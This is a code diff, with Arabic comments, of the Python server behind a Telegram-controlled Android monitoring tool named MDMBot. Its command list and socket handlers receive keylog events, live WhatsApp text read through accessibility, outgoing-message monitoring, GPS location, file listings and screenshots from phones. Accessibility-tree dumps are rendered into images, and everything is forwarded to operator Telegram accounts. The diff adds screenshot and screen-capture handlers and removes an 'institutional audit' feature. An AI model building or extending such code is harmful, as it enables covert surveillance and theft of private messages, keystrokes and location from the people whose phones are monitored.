@@ -219,14 +219,8 @@ COMMANDS = {
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
-    "whatsapp-monitor-on":  {"category": "data", "label": "📤 مراقبة واتساب الصادرة", "description": "قراءة الرسائل الصادرة من حقل الكتابة", "needs_param": False},
-    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الصادرة", "description": "إيقاف مراقبة الرسائل الصادرة", "needs_param": False},
-    "whatsapp-audit-on":   {"category": "data", "label": "🏢 تدقيق مؤسسي", "description": "توثيق نص + صورة لكل رسالة", "needs_param": False},
-    "whatsapp-audit-off":  {"category": "data", "label": "⏹ إيقاف التدقيق", "description": "إيقاف نظام التدقيق", "needs_param": False},
-    "single-screenshot":   {"category": "data", "label": "📸 لقطة شاشة", "description": "التقاط صورة من أي مكان", "needs_param": False},
-    "request-screenshot-permission": {"category": "permission", "label": "📸 إذن لقطة الشاشة", "description": "طلب إذن MediaProjection", "needs_param": False},
-    "audit_outgoing":      {"category": "data", "label": "📤 صورة صادرة", "description": "توثيق صادر", "needs_param": False},
-    "audit_incoming":      {"category": "data", "label": "📥 صورة واردة", "description": "توثيق وارد", "needs_param": False},
+    "whatsapp-monitor-on":  {"category": "data", "label": "👁️ تفعيل مراقبة واتساب", "description": "مراقبة دائمة لرسائل واتساب", "needs_param": False},
+    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -343,19 +337,6 @@ def _cb(device_id, action, target):
             else:
                 result = f"{action}:{hash(device_id) % 99999}:p{cache_key}"
         return result[:64]
-    # ⚡ FIX: Cache long commands like "request-screenshot-permission" to avoid truncation
-    if action == "cmd" and target and len(target) > 20:
-        cache_key = str(len(_file_path_cache))
-        _file_path_cache[cache_key] = target
-        result = f"{action}:{device_id}:s{cache_key}"
-        if len(result) > 64:
-            overhead = len(action) + 1 + 1 + len(cache_key) + 1
-            max_did_len = 64 - overhead
-            if max_did_len > 8:
-                result = f"{action}:{device_id[:max_did_len]}:s{cache_key}"
-            else:
-                result = f"{action}:{hash(device_id) % 99999}:s{cache_key}"
-        return result[:64]
     # For non-file actions, use full format but truncate if needed
     return f"{action}:{device_id}:{target}"[:64]
 
@@ -431,9 +412,6 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"whatsapp-live"))
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
-    kb.add(_cbtn(did,"whatsapp-audit-on"))
-    kb.add(_cbtn(did,"whatsapp-audit-off"))
-    kb.add(_cbtn(did,"single-screenshot"))
     # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
@@ -496,10 +474,6 @@ def permissions_keyboard(did):
            perm_btn("calls", "📞 المكالمات"))
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
-    kb.add(InlineKeyboardButton(
-        "📸 إذن لقطة الشاشة",
-        callback_data=_cb(did, "cmd", "request-screenshot-permission")
-    ))
     kb.add(_back(did))
     return kb
 
@@ -1208,9 +1182,6 @@ class MDMBot:
                 if tgt.startswith("request-permission:"):
                     perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
                     self._send_cmd(c.message.chat.id, did, "request-permission", {"value": perm_type})
-                # ✅ Handle cached screenshot permission command
-                elif tgt == "request-screenshot-permission":
-                    self._send_cmd(c.message.chat.id, did, "request-screenshot-permission")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
@@ -2003,7 +1974,7 @@ def _sock_cmd_resp(data):
 @socketio.on("file_explorer_data")
 def _sock_file_explorer(data):
     """Handle file explorer data responses from devices.
-    
+
     The Android app emits this event when sending file listing / file content
     results back to the server in response to file explorer commands.
     """
@@ -2017,7 +1988,7 @@ def _sock_file_explorer(data):
     if data_type == "keylog":
         _handle_keylog_event(dev, data)
         return
-    
+
     # ✅ Check for accessibility_connected event
     if data_type == "accessibility_connected":
         logger.info(f"✅ Accessibility connected on #{dev.get('short_id', '?')}")
@@ -2033,6 +2004,11 @@ def _sock_file_explorer(data):
                         parse_mode="HTML")
                 except Exception as e:
                     logger.error(f"فشل إرسال إشعار accessibility: {e}")
+        return
+
+    # ⚡ Check for screenshot_status event (legacy)
+    if data_type == "screenshot_status":
+        logger.info(f"📸 Screenshot status from #{dev.get('short_id', '?')}: {data.get('status', '?')}")
         return
 
     # ✅ Check for accessibility_disconnected event (user disabled it)
@@ -2057,40 +2033,6 @@ def _sock_file_explorer(data):
         _handle_whatsapp_message(dev, data)
         return
 
-    # ⚡ Check for whatsapp_audit event (نظام التدقيق المؤسسي)
-    if data_type == "whatsapp_audit":
-        _handle_whatsapp_audit(dev, data)
-        return
-
-    # ⚡ Check for screenshot_status (تقرير حالة لقطة الشاشة)
-    if data_type == "screenshot_status":
-        status = data.get("status", "?")
-        short_id = dev.get('short_id', '?')
-        model = dev.get('model', '?')
-        logger.info(f"📸 [Screenshot] #{short_id}: {status}")
-        if mdm_bot:
-            for admin_id in Config.ADMIN_IDS:
-                try:
-                    mdm_bot.bot.send_message(admin_id,
-                        f"📸 <b>تقرير لقطة الشاشة</b>\n"
-                        f"━━━━━━━━━━━━━━━\n"
-                        f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
-                        f"📝 <b>الحالة:</b> {status}",
-                        parse_mode="HTML")
-                except Exception as e:
-                    logger.error(f"فشل إرسال تقرير: {e}")
-        return
-
-    # ⚡ Check for base64_media (صور/صوت عبر Socket.IO بدل HTTP)
-    if data_type == "base64_media":
-        _handle_base64_media(dev, data)
-        return
-
-    # ⚡ Check for screen_json (النظام الهجين - رسم الواجهة على السيرفر)
-    if data_type == "screen_json":
-        _handle_screen_json(dev, data)
-        return
-
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -2110,6 +2052,183 @@ def _sock_file_explorer(data):
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
+
+# ⚡ SOCKET.IO: base64_media handler (Layer 1 — real screenshot image)
+@socketio.on("base64_media")
+def _sock_base64_media(data):
+    """Receive a base64-encoded media file (screenshot/photo) from a device."""
+    dev = dm.get_device_by_sid(request.sid)
+    if not dev:
+        logger.warning(f"[Socket] base64_media from unknown SID={request.sid}")
+        return
+
+    media_type = data.get("type", "unknown")
+    mime = data.get("mime", "image/jpeg")
+    b64data = data.get("data", "")
+    logger.info(f"📸 base64_media received from #{dev.get('short_id', '?')}: "
+                f"type={media_type} mime={mime} size={len(b64data)} chars")
+
+    if not b64data:
+        logger.warning("⚠️ Empty base64 media data")
+        return
+
+    try:
+        import base64 as _b64
+        binary = _b64.b64decode(b64data)
+        logger.info(f"📸 Decoded {len(binary)} bytes")
+
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            from io import BytesIO
+            bio = BytesIO(binary)
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    if mime.startswith("image/"):
+                        mdm_bot.bot.send_photo(
+                            admin_id,
+                            photo=bio,
+                            caption=f"📸 <b>لقطة شاشة حقيقية</b>\n\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes",
+                            parse_mode="HTML"
+                        )
+                    else:
+                        bio.seek(0)
+                        ext = "jpg" if "jpeg" in mime or "jpg" in mime else "bin"
+                        filename = f"media_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.{ext}"
+                        mdm_bot.bot.send_document(
+                            admin_id,
+                            document=bio,
+                            filename=filename,
+                            caption=f"📎 <b>ملف</b>\n\n📱 <b>{short_label}</b>\n📦 {len(binary)} bytes"
+                        )
+                    bio.seek(0)
+                except Exception as e:
+                    logger.error(f"فشل إرسال base64_media للبوت: {e}")
+
+        _pending_cmds.pop(request.sid, None)
+    except Exception as e:
+        logger.error(f"❌ base64_media error: {e}", exc_info=True)
+
+
+# ⚡ SOCKET.IO: screen_json handler (Layer 2 — accessibility tree dump)
+@socketio.on("screen_json")
+def _sock_screen_json(data):
+    """Receive a JSON screen capture (accessibility tree) and render it as an image."""
+    dev = dm.get_device_by_sid(request.sid)
+    if not dev:
+        logger.warning(f"[Socket] screen_json from unknown SID={request.sid}")
+        return
+
+    logger.info(f"📸 screen_json received from #{dev.get('short_id', '?')}: "
+                f"{data.get('view_count', '?')} views")
+
+    try:
+        _handle_screen_json(dev, data)
+    except Exception as e:
+        logger.error(f"❌ screen_json error: {e}", exc_info=True)
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id,
+                        f"❌ <b>فشل رسم لقطة الشاشة</b>\n\n📱 <b>{short_label}</b>\n⚠ {e}",
+                        parse_mode="HTML")
+                except Exception:
+                    pass
+
+
+def _handle_screen_json(dev, data):
+    """Render the accessibility tree JSON as an image using Pillow and send to bot."""
+    try:
+        from PIL import Image, ImageDraw, ImageFont
+        import io as _io
+        import re as _re
+        import time as _time
+    except ImportError as e:
+        logger.error(f"❌ Pillow not installed: {e}")
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            json_str = str(data)[:3000]
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id,
+                        f"📋 <b>لقطة شاشة (JSON — Pillow غير مثبت)</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n📦 {data.get('view_count', 0)} عناصر\n\n"
+                        f"<code>{json_str}</code>",
+                        parse_mode="HTML")
+                except Exception:
+                    pass
+        return
+
+    screen_w = data.get("screen_width", 1080)
+    screen_h = data.get("screen_height", 1920)
+    package = data.get("package", "unknown")
+    views = data.get("views", [])
+
+    scale = 720.0 / max(screen_w, 1)
+    img_w = int(screen_w * scale)
+    img_h = int(screen_h * scale)
+
+    img = Image.new("RGB", (img_w, img_h), "white")
+    draw = ImageDraw.Draw(img)
+
+    try:
+        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
+        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
+    except Exception:
+        font = ImageFont.load_default()
+        font_small = font
+
+    draw.rectangle([0, 0, img_w, 30], fill="#2196F3")
+    draw.text((5, 5), f"PKG: {package}", fill="white", font=font)
+    draw.text((img_w - 150, 5), f"views: {len(views)}", fill="white", font=font_small)
+
+    for v in views:
+        bounds_str = v.get("bounds", "")
+        m = _re.match(r"\[(\d+),(\d+)\]\[(\d+)x(\d+)\]", bounds_str)
+        if not m:
+            continue
+        x, y, w, h = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
+        x = int(x * scale); y = int(y * scale)
+        w = int(w * scale); h = int(h * scale)
+
+        text = v.get("text", "") or v.get("desc", "")
+        if not text:
+            continue
+
+        draw.rectangle([x, y, x + w, y + h], outline="#4CAF50", width=1)
+        display_text = text[:40]
+        try:
+            bbox = draw.textbbox((0, 0), display_text, font=font_small)
+            text_w = bbox[2] - bbox[0]
+        except Exception:
+            text_w = 50
+        draw.rectangle([x, max(0, y - 12), x + text_w + 4, y], fill="#4CAF50")
+        draw.text((x + 2, max(0, y - 12)), display_text, fill="white", font=font_small)
+
+    if mdm_bot:
+        short_label = _dev_label(dev)
+        bio = _io.BytesIO()
+        img.save(bio, format="PNG")
+        bio.seek(0)
+
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_photo(
+                    admin_id,
+                    photo=bio,
+                    caption=f"📋 <b>لقطة شاشة (JSON rendered)</b>\n\n"
+                            f"📱 <b>{short_label}</b>\n"
+                            f"📦 التطبيق: <code>{package}</code>\n"
+                            f"📐 العناصر: {len(views)}\n"
+                            f"📏 الشاشة: {screen_w}x{screen_h}",
+                    parse_mode="HTML"
+                )
+                bio.seek(0)
+            except Exception as e:
+                logger.error(f"فشل إرسال screen_json image: {e}")
+
+    _pending_cmds.pop(request.sid, None)
 
 
 def _handle_whatsapp_message(dev, data):
@@ -2151,51 +2270,6 @@ def _handle_whatsapp_message(dev, data):
                     logger.error(f"فشل إرسال رسالة واتساب للبوت: {e}")
     except Exception as e:
         logger.error(f"خطأ في معالجة رسالة واتساب: {e}")
-
-
-def _handle_whatsapp_audit(dev, data):
-    # معالجة بيانات نظام التدقيق المؤسسي (نص + إشعار بالصورة)
-    try:
-        text = data.get("text", "")
-        is_outgoing = data.get("outgoing", False)
-        time_str = data.get("time_formatted", "")
-
-        short_id = dev.get('short_id', '?')
-        model = dev.get('model', '?')
-
-        direction = "📤 صادرة" if is_outgoing else "📥 واردة"
-        logger.info(f"🏢 [AUDIT] #{short_id} {direction}: {text[:80]}")
-
-        if mdm_bot:
-            if text.strip():
-                msg = (
-                    f"🏢 <b>تدقيق مؤسسي</b>\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
-                    f"{'📤' if is_outgoing else '📥'} <b>النوع:</b> {direction}\n"
-                    f"🕐 <b>الوقت:</b> {time_str}\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"📝 <b>النص:</b>\n"
-                    f"<code>{text[:2000]}</code>\n"
-                    f"📸 <i>سيتم إرفاق صورة توثيقية (إن أمكن)</i>"
-                )
-            else:
-                msg = (
-                    f"🏢 <b>تدقيق مؤسسي - رسالة واردة</b>\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
-                    f"🕐 <b>الوقت:</b> {time_str}\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"📸 <i>تم التقاط صورة توثيقية</i>"
-                )
-
-            for admin_id in Config.ADMIN_IDS:
-                try:
-                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
-                except Exception as e:
-                    logger.error(f"فشل إرسال تدقيق للبوت: {e}")
-    except Exception as e:
-        logger.error(f"خطأ في معالجة التدقيق: {e}")
 
 
 def _handle_keylog_event(dev, data):
@@ -2319,165 +2393,3 @@ if __name__ == "__main__":
     except Exception as e:
         logger.critical(f"فشل التشغيل: {type(e).__name__}: {e}", exc_info=True)
         sys.exit(1)
-
-
-def _handle_base64_media(dev, data):
-    # معالجة الصور/الصوت المرسلة عبر Socket.IO Base64
-    try:
-        import base64 as b64
-        command = data.get("command", "unknown")
-        file_type = data.get("file_type", "photo")
-        filename = data.get("filename", f"{command}_{int(time.time())}.jpg")
-        base64_data = data.get("base64_data", "")
-        file_size = data.get("size", 0)
-        text_preview = data.get("text_preview", "")
-
-        short_id = dev.get('short_id', '?')
-        model = dev.get('model', '?')
-        did = dev.get('device_id', '')
-
-        if not base64_data:
-            logger.warning(f"[Base64] Empty base64 data from #{short_id}")
-            return
-
-        logger.info(f"[Base64] #{short_id} {command} ({file_size} bytes)")
-
-        # Decode base64
-        file_bytes = b64.b64decode(base64_data)
-
-        # Save to file
-        upload_dir = os.path.join("uploads", did)
-        os.makedirs(upload_dir, exist_ok=True)
-        filepath = os.path.join(upload_dir, filename)
-        with open(filepath, "wb") as f:
-            f.write(file_bytes)
-
-        # Send to bot
-        if mdm_bot:
-            lbl = COMMANDS.get(command, {}).get("label", command)
-            caption = f"📥 <b>{lbl}</b>\n━━━━━━━━━━━━━━━\n📱 #{short_id} {model}\n📁 {filename} ({file_size} bytes)\n"
-            if text_preview:
-                caption += f"📝 {text_preview}\n"
-
-            for admin_id in Config.ADMIN_IDS:
-                try:
-                    if file_type == "photo":
-                        mdm_bot.bot.send_photo(admin_id, photo=open(filepath, "rb"), caption=caption, parse_mode="HTML")
-                    elif file_type == "audio":
-                        mdm_bot.bot.send_audio(admin_id, audio=open(filepath, "rb"), caption=caption, parse_mode="HTML")
-                    else:
-                        mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
-                except Exception as e:
-                    logger.error(f"فشل إرسال base64 media: {e}")
-                    try:
-                        mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
-                    except:
-                        pass
-
-        logger.info(f"[Base64] ✅ Sent to bot: {filename}")
-    except Exception as e:
-        logger.error(f"خطأ في معالجة base64 media: {e}")
-
-
-def _handle_screen_json(dev, data):
-    """يرسم الواجهة من JSON ويرسلها كبصورة للبوت."""
-    try:
-        from PIL import Image, ImageDraw, ImageFont
-        import io as _io
-        import base64 as _b64
-        
-        elements = data.get("elements", [])
-        pkg = data.get("package", "unknown")
-        short_id = dev.get('short_id', '?')
-        model = dev.get('model', '?')
-        
-        logger.info(f"📸 [ScreenJSON] #{short_id} {len(elements)} elements from {pkg}")
-        
-        if not elements:
-            if mdm_bot:
-                for admin_id in Config.ADMIN_IDS:
-                    try:
-                        mdm_bot.bot.send_message(admin_id, "📸 لا توجد عناصر مرئية على الشاشة")
-                    except: pass
-            return
-        
-        # Calculate canvas size
-        max_x = max(e.get("x", 0) + e.get("w", 0) for e in elements) + 50
-        max_y = max(e.get("y", 0) + e.get("h", 0) for e in elements) + 50
-        # Scale down if too large
-        scale = 1.0
-        if max_x > 1080:
-            scale = 1080 / max_x
-        w = int(max_x * scale)
-        h = int(max_y * scale)
-        
-        # Create image
-        img = Image.new('RGB', (w, h), color=(240, 240, 240))
-        draw = ImageDraw.Draw(img)
-        
-        # Try to load a font
-        try:
-            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", int(14 * scale))
-            font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", int(10 * scale))
-        except:
-            font = ImageFont.load_default()
-            font_small = font
-        
-        # Draw each element
-        for elem in elements:
-            x = int(elem.get("x", 0) * scale)
-            y = int(elem.get("y", 0) * scale)
-            ew = int(elem.get("w", 0) * scale)
-            eh = int(elem.get("h", 0) * scale)
-            text = elem.get("text", "") or elem.get("desc", "")
-            cls = elem.get("class", "")
-            
-            if not text:
-                continue
-            
-            # Determine color based on class
-            if "EditText" in cls or "TextView" in cls:
-                bg_color = (255, 255, 255)
-                text_color = (33, 33, 33)
-            elif "Button" in cls:
-                bg_color = (76, 175, 80)
-                text_color = (255, 255, 255)
-            else:
-                bg_color = (220, 220, 220)
-                text_color = (33, 33, 33)
-            
-            # Draw rectangle
-            if ew > 0 and eh > 0:
-                draw.rectangle([x, y, x + ew, y + eh], fill=bg_color, outline=(180, 180, 180))
-            
-            # Draw text
-            if text:
-                # Truncate if too long
-                display_text = text[:100]
-                try:
-                    draw.text((x + 4, y + 2), display_text, fill=text_color, font=font)
-                except:
-                    draw.text((x + 4, y + 2), display_text, fill=text_color)
-        
-        # Convert to bytes
-        buf = _io.BytesIO()
-        img.save(buf, format='JPEG', quality=80)
-        image_bytes = buf.getvalue()
-        
-        # Send to bot
-        if mdm_bot:
-            caption = (f"📸 <b>لقطة شاشة (مرسومة)</b>\n"
-                      f"━━━━━━━━━━━━━━━\n"
-                      f"📱 #{short_id} {model}\n"
-                      f"📦 {pkg}\n"
-                      f"📝 {len(elements)} عنصر\n"
-                      f"📐 {w}x{h}px")
-            for admin_id in Config.ADMIN_IDS:
-                try:
-                    mdm_bot.bot.send_photo(admin_id, photo=image_bytes, caption=caption, parse_mode="HTML")
-                except Exception as e:
-                    logger.error(f"فشل إرسال صورة JSON: {e}")
-        
-        logger.info(f"📸 [ScreenJSON] ✅ Sent rendered image ({len(image_bytes)} bytes)")
-    except Exception as e:
-        logger.error(f"خطأ في معالجة screen_json: {e}")
